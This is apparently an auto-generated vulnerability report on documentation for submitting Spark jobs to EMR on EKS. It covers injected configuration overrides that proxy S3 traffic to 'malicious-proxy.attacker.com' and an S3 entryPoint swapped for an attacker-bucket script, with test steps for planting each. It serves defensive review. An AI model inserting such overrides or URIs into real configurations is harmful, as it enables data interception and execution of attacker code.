### Vulnerability List:

- Vulnerability Name: **Code Injection via Malicious Spark Configuration Overrides**
- Description:
  - An attacker could inject subtly malicious configurations into the `configurationOverrides` section of code examples provided in the documentation.
  - If a user copy-pastes these examples and uses them to submit Spark jobs, the malicious configurations will be applied to their EMR on EKS environment.
  - Step-by-step trigger:
    1. Attacker modifies a markdown file (e.g., `/code/content/submit-applications/docs/spark/pyspark.md`) in the repository.
    2. Attacker injects a malicious configuration within a code block, for example, altering the `spark.hadoop.fs.s3.proxy.host` to redirect S3 traffic to an attacker-controlled proxy.
    3. A user, intending to follow best practices, copies the provided code example.
    4. User executes the modified `aws emr-containers start-job-run` command in their environment.
    5. The Spark job starts with the injected malicious configuration overrides.
- Impact:
  - By controlling configuration overrides, an attacker could potentially:
    - Redirect job logs to an external attacker-controlled server by manipulating monitoring configurations.
    - Modify security settings, such as disabling authentication or encryption features if such configurations were to be added to documentation.
    - Alter job behavior to exfiltrate data to an external location by manipulating spark configurations related to data output paths or external data access.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None. The project is documentation and sample code, and does not inherently prevent copy-pasting of potentially malicious content.
- Missing Mitigations:
  - Implement a security review process for all documentation changes, especially code examples, to detect and prevent injection of malicious configurations.
  - Add a clear warning to the documentation advising users to carefully review and understand any code examples before using them in production, especially configurations that affect security settings or data handling.
- Preconditions:
  - An attacker needs to be able to modify the documentation files in the repository (e.g., via a successful Pull Request if not a repository admin).
  - A user must copy and paste the malicious code example from the documentation and execute it in their EMR on EKS environment.
- Source Code Analysis:
  - Vulnerability is not in the source code of the project itself, but in the content of the documentation files, specifically in the code examples provided in markdown files across the `/code/content/` directory.
  - Example of vulnerable code snippet in `/code/content/submit-applications/docs/spark/pyspark.md`:
    ```json
    "configurationOverrides": {
      "applicationConfiguration": [
        {
          "classification": "spark-defaults",
          "properties": {
            "spark.hadoop.fs.s3.proxy.host": "malicious-proxy.attacker.com",
            "spark.hadoop.fs.s3.proxy.port": "8080"
           }
        }
      ],
      "monitoringConfiguration": {
        "cloudWatchMonitoringConfiguration": {
          "logGroupName": "/emr-containers/jobs",
          "logStreamNamePrefix": "demo"
        },
        "s3MonitoringConfiguration": {
          "logUri": "s3://joblogs"
        }
      }
    }
    ```
  - This snippet, if copy-pasted, would configure the Spark job to route all S3 traffic through `malicious-proxy.attacker.com:8080`, potentially allowing the attacker to intercept sensitive data.
- Security Test Case:
  - Step 1: Modify the file `/code/content/submit-applications/docs/spark/pyspark.md`.
  - Step 2: Introduce the following malicious `configurationOverrides` in one of the code examples:
    ```json
    "configurationOverrides": {
      "applicationConfiguration": [
        {
          "classification": "spark-defaults",
          "properties": {
            "spark.hadoop.fs.s3.proxy.host": "malicious-proxy.attacker.com",
            "spark.hadoop.fs.s3.proxy.port": "8080"
           }
        }
      ],
      "monitoringConfiguration": {
        "cloudWatchMonitoringConfiguration": {
          "logGroupName": "/emr-containers/jobs",
          "logStreamNamePrefix": "demo"
        },
        "s3MonitoringConfiguration": {
          "logUri": "s3://joblogs"
        }
      }
    }
    ```
  - Step 3: Commit and push the changes to the repository.
  - Step 4: As a test user, copy the modified code example from `/code/content/submit-applications/docs/spark/pyspark.md`.
  - Step 5: Execute the copied `aws emr-containers start-job-run` command against a test EMR on EKS virtual cluster.
  - Step 6: Observe the Spark job execution. Network traffic analysis from within the Spark driver or executor pod (if possible in the test environment) would show attempts to connect to `malicious-proxy.attacker.com:8080` when accessing S3. Alternatively, monitoring logs might reveal errors related to S3 access if the proxy is not correctly set up to forward requests.
  - Step 7: This test case demonstrates that malicious configurations can be injected and, if copy-pasted, will be applied to the user's EMR on EKS environment, confirming the vulnerability.

- Vulnerability Name: **Code Injection via Malicious S3 URI in Examples**
- Description:
  - An attacker could replace legitimate S3 URIs in code examples with malicious ones.
  - If a user copy-pastes these examples, their Spark jobs could interact with attacker-controlled S3 buckets, potentially leading to data exfiltration or execution of malicious code if the URI points to an executable script.
  - Step-by-step trigger:
    1. Attacker modifies a markdown file (e.g., `/code/tools/start-job-run-converter/README.md`) in the repository.
    2. Attacker replaces a legitimate S3 URI in a code block with a malicious S3 URI, pointing to an attacker-controlled bucket, for example, changing `s3://<s3 bucket>/health_violations.py` to `s3://attacker-bucket/malicious_script.py`.
    3. A user, intending to use the tool and follow the example, copies the provided code example.
    4. User executes the modified script, which includes the `aws emr-containers start-job-run` command with the malicious S3 URI.
    5. The Spark job attempts to execute the script from the attacker-controlled S3 bucket.
- Impact:
  - By controlling S3 URIs in examples, an attacker could potentially:
    - Trick users into running malicious scripts as their Spark job's entry point.
    - Exfiltrate data by directing job outputs to an attacker-controlled S3 bucket.
    - Cause denial of service by pointing to non-existent or excessively large files in S3.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None. The project is documentation and sample code, and does not inherently prevent copy-pasting of potentially malicious content.
- Missing Mitigations:
  - Implement a security review process for all documentation changes, especially code examples, to detect and prevent injection of malicious S3 URIs.
  - Add a clear warning to the documentation advising users to carefully review and validate any S3 URIs in code examples before using them, ensuring they point to trusted and expected locations.
- Preconditions:
  - An attacker needs to be able to modify the documentation files in the repository.
  - A user must copy and paste the malicious code example from the documentation and execute it in their EMR on EKS environment.
- Source Code Analysis:
  - Vulnerability is not in the source code of the project itself, but in the content of the documentation files, specifically in the code examples provided in markdown files across the `/code/content/` and `/code/tools/` directories.
  - Example of vulnerable code snippet in `/code/tools/start-job-run-converter/README.md`:
    ```markdown
    --job-driver '{
        "sparkSubmitJobDriver": {
            "entryPoint": "s3://<s3 bucket>/health_violations.py",
            ...
        }
    }'
    ```
  - By replacing `s3://<s3 bucket>/health_violations.py` with `s3://attacker-bucket/malicious_script.py`, an attacker could trick users into executing `malicious_script.py` as their Spark job.
- Security Test Case:
  - Step 1: Modify the file `/code/tools/start-job-run-converter/README.md`.
  - Step 2: Replace the legitimate `entryPoint` S3 URI in one of the code examples with a malicious S3 URI:
    ```markdown
    --job-driver '{
        "sparkSubmitJobDriver": {
            "entryPoint": "s3://attacker-bucket/malicious_script.py",
            ...
        }
    }'
    ```
  - Step 3: Ensure `s3://attacker-bucket/malicious_script.py` contains a simple script that, for example, prints a message and exits, to avoid unintended harm during testing.
  - Step 4: Commit and push the changes to the repository.
  - Step 5: As a test user, copy the modified code example from `/code/tools/start-job-run-converter/README.md`.
  - Step 6: Replace placeholder values (like `<virtual-cluster-id>`, `<execution-role-arn>`) in the copied command with valid values for a test EMR on EKS virtual cluster.
  - Step 7: Execute the copied `aws emr-containers start-job-run` command.
  - Step 8: Check the CloudWatch logs or S3 logs for the Spark job. If the job executes successfully and the logs contain the output of `malicious_script.py`, it confirms that the malicious script from the attacker-controlled S3 bucket was executed.
  - Step 9: This test case demonstrates that malicious S3 URIs can be injected and, if copy-pasted, will lead to the execution of attacker-controlled code in the user's EMR on EKS environment, confirming the vulnerability.